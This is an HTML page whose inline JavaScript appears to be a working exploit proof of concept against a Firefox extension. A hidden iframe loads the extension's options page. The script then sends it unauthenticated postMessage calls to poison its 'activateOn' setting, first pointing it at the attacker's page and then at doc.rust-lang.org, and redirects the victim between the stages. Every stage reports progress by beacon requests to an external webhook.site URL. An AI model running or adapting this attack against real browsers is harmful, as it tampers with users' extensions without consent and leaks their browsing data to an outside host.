<body>
<script>
const EXT_UUID = '09a6c422-a354-447d-b4ea-185cb10be869';
const OPTIONS  = `moz-extension://${EXT_UUID}/options.html`;
const EXFIL    = 'https://webhook.site/f47c89f8-5038-4c47-9d6c-53d7bc38f41c';
const beacon = (s) => { try { new Image().src = EXFIL + '/b?s=' + encodeURIComponent(s) + '&t=' + Date.now(); } catch(e){} };

function setActivateOn(urlStr) {
  return new Promise((res) => {
    const f = document.createElement('iframe');
    f.style.display = 'none';
    f.src = OPTIONS;
    f.onload = () => { setTimeout(() => { try{ f.contentWindow.postMessage(urlStr, '*'); }catch(e){ beacon('pm-err:'+e); } res(); }, 300); };
    f.onerror = () => { beacon('iframe-err'); res(); };
    document.body.appendChild(f);
  });
}
const wait = (ms) => new Promise(r => setTimeout(r, ms));

(async () => {
  const stage = new URL(location.href).searchParams.get('stage');
  beacon('load:' + (stage||'init') + ':' + location.href);

  if (stage !== 'poison') {
    await setActivateOn(location.origin + '/#https://doc.rust-lang.org/');
    beacon('set-activateOn-self');
    await wait(1500);
    beacon('nav->poison');
    location.href = '?stage=poison#https://doc.rust-lang.org/';
    return;
  }

  await wait(4000);
  beacon('poison-waited');
  await setActivateOn('https://doc.rust-lang.org/');
  beacon('set-activateOn-docs');
  await wait(1500);
  beacon('nav->docs');
  location.href = 'https://doc.rust-lang.org/stable/std/index.html';
})();
</script>
